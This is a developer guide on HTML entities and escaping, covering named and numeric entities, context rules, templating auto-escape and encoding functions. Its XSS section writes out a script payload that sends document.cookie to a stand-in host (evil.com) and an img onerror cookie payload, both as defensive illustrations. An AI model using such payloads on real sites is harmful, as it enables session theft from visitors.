---
title: "HTML Entities Explained: When and How to Escape Characters"
description: "HTML entities prevent broken layouts and security vulnerabilities. This guide covers named and numeric entities, when escaping is mandatory, and the characters developers forget most often."
category: "Developer Tools"
tools: ["html-entities"]
tags: ["html", "web development", "escaping", "security", "encoding", "xss"]
publishedAt: "2026-05-22"
author: "olivia-bennett"
---

Every HTML document is parsed by a browser that assigns special meaning to a small set of characters. The angle bracket `<` starts a tag. The ampersand `&` starts an entity reference. The quote marks `"` and `'` delimit attribute values. When your content contains these characters — and in real applications it always does — you have two choices: escape them correctly, or produce broken, exploitable HTML.

HTML entities are the escaping mechanism. They let you represent any character, including reserved and non-printable ones, in a way the browser can parse unambiguously. This guide covers what entities are, when they are mandatory, which ones developers miss most often, and the security consequences of getting it wrong.

---

## What Is an HTML Entity?

An HTML entity is a text sequence that begins with `&` and ends with `;`. The browser replaces it with the corresponding character during parsing, before the page is rendered or scripts are executed.

Entities come in two forms:

**Named entities** use a mnemonic name:

```html
&amp;   → &
&lt;    → <
&gt;    → >
&quot;  → "
&apos;  → '
&nbsp;  → non-breaking space
&copy;  → ©
&mdash; → —
```

**Numeric entities** use a Unicode code point, either decimal or hexadecimal:

```html
&#38;    → & (decimal)
&#x26;   → & (hexadecimal)
&#60;    → <
&#x3C;   → <
&#8212;  → —
&#x2014; → —
```

Named entities only exist for a defined subset of characters. Numeric entities work for any Unicode code point — there are over 1.1 million of them, though named entities cover the commonly needed ones.

Use the [HTML Entities tool](/tools/html-entities) to look up any character's entity, convert between named and numeric forms, and encode or decode entire blocks of HTML.

---

## The Five Characters You Must Always Escape

Five characters have mandatory escaping requirements in HTML content and attributes:

### 1. Ampersand `&` → `&amp;`

The ampersand is the entity prefix character. A bare `&` in HTML is treated as the start of an entity reference. If the browser cannot parse a valid entity, behaviour varies — some browsers display it literally, others silently drop it, and HTML validators flag it as an error.

```html
<!-- Wrong — "Marks & Spencer" may render as "Marks  Spencer" or trigger a parse error -->
<p>Marks & Spencer</p>

<!-- Correct -->
<p>Marks &amp; Spencer</p>
```

**In URLs inside attributes, always encode ampersands:**

```html
<!-- Wrong — browser may misparse the query string -->
<a href="/search?q=html&page=2">Next</a>

<!-- Correct -->
<a href="/search?q=html&amp;page=2">Next</a>
```

### 2. Less-than `<` → `&lt;`

The less-than sign opens an HTML tag. Any bare `<` in content can confuse the parser into treating the following text as a tag name.

```html
<!-- Wrong — browser tries to parse <script> as a tag -->
<p>Use if (a < b) to compare values</p>

<!-- Correct -->
<p>Use if (a &lt; b) to compare values</p>
```

This is especially critical in code examples, technical documentation, and anywhere user-generated content is displayed.

### 3. Greater-than `>` → `&gt;`

While `>` is less dangerous than `<` in most contexts (it only closes the current element), escaping it is still best practice and required in certain HTML5 parsing modes.

```html
<p>The arrow operator &gt;&gt; shifts bits right</p>
```

### 4. Double quote `"` → `&quot;`

Required inside double-quoted attribute values. If your attribute value contains a double quote, the browser interprets it as closing the attribute.

```html
<!-- Wrong — the attribute closes at the first " inside the value -->
<input value="Say "hello" to HTML">

<!-- Correct -->
<input value="Say &quot;hello&quot; to HTML">
```

### 5. Single quote `'` → `&apos;` or `&#39;`

Required inside single-quoted attribute values. Note that `&apos;` was not part of the original HTML4 spec (only XHTML) — use `&#39;` if you need maximum compatibility.

```html
<!-- In single-quoted attributes -->
<input value='It&#39;s a trap'>
```

---

## When Escaping Is Mandatory vs. Optional

The requirement depends on context:

| Context | `&` | `<` | `>` | `"` | `'` |
|---|---|---|---|---|---|
| Body text | **Required** | **Required** | Recommended | Not needed | Not needed |
| Double-quoted attribute | **Required** | Recommended | Not needed | **Required** | Not needed |
| Single-quoted attribute | **Required** | Recommended | Not needed | Not needed | **Required** |
| Unquoted attribute | **Required** | **Required** | **Required** | **Required** | **Required** |
| `<script>` content | N/A — use JavaScript string escaping | | | | |
| `<style>` content | N/A — use CSS escaping | | | | |

**The safest rule:** escape all five characters everywhere, regardless of context. Modern templating engines and escaping libraries do this by default — you should never be manually reasoning about which characters need escaping in which context.

---

## The Security Dimension: XSS

Failing to escape HTML entities in user-generated content is the most common cause of Cross-Site Scripting (XSS) vulnerabilities. XSS allows an attacker to inject arbitrary HTML and JavaScript into your pages, which then runs in your visitors' browsers.

### Reflected XSS via unescaped output

Consider a search results page:

```html
<!-- Server template renders search query directly -->
<h1>Results for: <%= params[:query] %></h1>
```

An attacker crafts a URL:

```
/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

If the query parameter is not escaped, the browser parses the injected `<script>` tag and executes it. The attacker can steal session cookies, redirect the user, or log keystrokes.

**With proper escaping:**

```html
<!-- After HTML entity encoding -->
<h1>Results for: &lt;script&gt;document.location=...&lt;/script&gt;</h1>
```

The browser renders the raw text. No script executes.

### Stored XSS via database content

Stored XSS is more dangerous: the attacker saves malicious content to your database (via a comment, profile bio, or form field), and every user who views that content runs the script.

```html
<!-- User submits bio: <img src=x onerror=alert(document.cookie)> -->
<!-- Without escaping, every visitor who views this profile runs the payload -->
<div class="bio"><img src=x onerror=alert(document.cookie)></div>
```

**The fix is always the same:** escape before rendering. Never trust content from a database, API, URL parameter, form field, or any external source.

### Context matters — HTML encoding is not enough everywhere

HTML entity encoding prevents injection into HTML content and attribute values. It does not prevent injection into:

- **JavaScript strings**: `<script>var name = "<%= user_name %>"</script>` — requires JavaScript string escaping (`\"`), not HTML entities
- **CSS**: `style="color: <%= user_color %>"` — requires CSS-specific sanitisation
- **URLs**: `href="<%= user_url %>"` — requires URL encoding and `javascript:` scheme blocking

Each context has its own escaping rules. HTML entity encoding is correct for HTML content and attributes, but it is not a universal solution. Use a security-focused templating engine that handles each context appropriately.

---

## Commonly Needed Entities

### Typography

```html
&mdash;   → — (em dash — used for parenthetical remarks)
&ndash;   → – (en dash — used for ranges: pages 10–20)
&hellip;  → … (ellipsis — preferred over three dots)
&laquo;   → « (left angle quotation mark)
&raquo;   → » (right angle quotation mark)
&ldquo;   → " (left double quotation mark)
&rdquo;   → " (right double quotation mark)
&lsquo;   → ' (left single quotation mark)
&rsquo;   → ' (right single quotation mark, also apostrophe)
&trade;   → ™
&reg;     → ®
&copy;    → ©
```

### Whitespace

```html
&nbsp;    → non-breaking space (prevents line break at this point)
&ensp;    → en space (half an em)
&emsp;    → em space (full em width)
&thinsp;  → thin space (one-sixth em — used in number formatting: 1 000 000)
```

`&nbsp;` is the most misused entity. It should be used to prevent unwanted line breaks — for example, keeping "100 km" on one line — not as a spacing hack. Use CSS `margin`, `padding`, and `gap` for layout spacing.

### Mathematical

```html
&times;   → × (multiplication sign — not the letter x)
&divide;  → ÷
&plusmn;  → ±
&ne;      → ≠
&le;      → ≤
&ge;      → ≥
&infin;   → ∞
&sum;     → ∑
&radic;   → √
&pi;      → π
&deg;     → °
```

### Arrows

```html
&larr;    → ←
&rarr;    → →
&uarr;    → ↑
&darr;    → ↓
&harr;    → ↔
&rArr;    → ⇒
&lArr;    → ⇐
&hArr;    → ⇔
```

---

## HTML Entities in Different Contexts

### In JSON attributes embedded in HTML

When embedding JSON in HTML data attributes, the double quotes in JSON conflict with attribute quoting:

```html
<!-- Wrong — attribute closes at the first " in the JSON -->
<div data-config="{"theme":"dark","lang":"en"}">

<!-- Option 1: Single-quote the attribute -->
<div data-config='{"theme":"dark","lang":"en"}'>

<!-- Option 2: Encode the JSON quotes -->
<div data-config="{&quot;theme&quot;:&quot;dark&quot;}">

<!-- Option 3: Use JSON.stringify and set via JavaScript — cleanest -->
<script>
  document.querySelector('[data-config]').dataset.config = JSON.stringify(config);
</script>
```

### In SVG

SVG embedded in HTML follows HTML escaping rules for inline SVG. SVG in a separate `.svg` file is XML and must escape `<`, `>`, `&`, `"`, and `'` strictly.

```html
<!-- Inline SVG in HTML — HTML escaping rules -->
<svg><text>R&amp;D</text></svg>

<!-- External SVG file — XML escaping rules (same characters, but strict) -->
```

### In templating engines

Most modern templating engines auto-escape by default:

```
<!-- Jinja2/Nunjucks — auto-escaped -->
{{ user.name }}

<!-- Jinja2/Nunjucks — raw/unescaped (dangerous with user content) -->
{{ user.name | safe }}

<!-- Handlebars — auto-escaped -->
{{ user.name }}

<!-- Handlebars — unescaped (dangerous with user content) -->
{{{ user.name }}}

<!-- React JSX — auto-escaped -->
<p>{user.name}</p>

<!-- React — raw HTML (dangerous with user content) -->
<p dangerouslySetInnerHTML={{ __html: user.bio }} />
```

The `safe` / triple-brace / `dangerouslySetInnerHTML` escape hatches exist for cases where you control the HTML content entirely — for example, rendering a CMS field that stores trusted rich text. Never use them with user-generated content.

---

## Encoding and Decoding in Code

### JavaScript

```javascript
// Encoding HTML entities
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Decoding HTML entities (browser-side only)
function decodeHtml(str) {
  const txt = document.createElement('textarea');
  txt.innerHTML = str;
  return txt.value;
}

// In Node.js — use a library
const he = require('he');  // npm install he
he.encode('<script>alert("xss")</script>');
// → '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
he.decode('&lt;p&gt;Hello&lt;/p&gt;');
// → '<p>Hello</p>'
```

### Python

```python
import html

# Encode
html.escape('<script>alert("xss")</script>')
# → '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'

# quote=True (default) encodes double quotes too
html.escape('Say "hello"', quote=True)
# → 'Say &quot;hello&quot;'

# Decode
html.unescape('&lt;p&gt;Hello &amp; world&lt;/p&gt;')
# → '<p>Hello & world</p>'
```

### PHP

```php
// Encode (HTML special chars only — the most common need)
htmlspecialchars('<script>alert("xss")</script>', ENT_QUOTES | ENT_HTML5, 'UTF-8');
// → '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'

// Encode (all named entities — for full HTML entity encoding)
htmlentities('<p>© 2026</p>', ENT_QUOTES | ENT_HTML5, 'UTF-8');
// → '&lt;p&gt;&copy; 2026&lt;/p&gt;'

// Decode
html_entity_decode('&lt;p&gt;Hello&lt;/p&gt;', ENT_QUOTES | ENT_HTML5, 'UTF-8');
// → '<p>Hello</p>'
```

Always use `ENT_QUOTES` to encode both single and double quotes, and always specify `UTF-8` as the character encoding.

---

## Common Mistakes

**Using `&nbsp;` for layout spacing.** This is the most common misuse of HTML entities. Non-breaking spaces add semantic meaning (the content on either side should not be broken across lines) but contribute no visual spacing beyond a regular space. Use CSS for spacing.

**Forgetting to escape ampersands in URLs.** In HTML attribute values, `&` in a URL query string must be `&amp;`. Most browsers are lenient, but validators will flag it and it can cause issues in strict XML contexts.

**Double-encoding.** If content is encoded once before storage and then encoded again on output, you get `&amp;lt;` instead of `&lt;` — the entity itself is escaped. Establish a clear rule: store raw content, escape on output.

**Using `htmlspecialchars()` without `ENT_QUOTES`.** PHP's `htmlspecialchars()` without `ENT_QUOTES` does not escape single quotes, which leaves you vulnerable in single-quoted attribute contexts.

**Trusting `innerText` to be safe.** `element.innerText = userContent` is safe — it sets text content, not HTML. `element.innerHTML = userContent` is not safe without escaping. These are easy to confuse.

Use the [HTML Entities tool](/tools/html-entities) to quickly encode or decode any block of content and verify your escaping is correct before deploying.
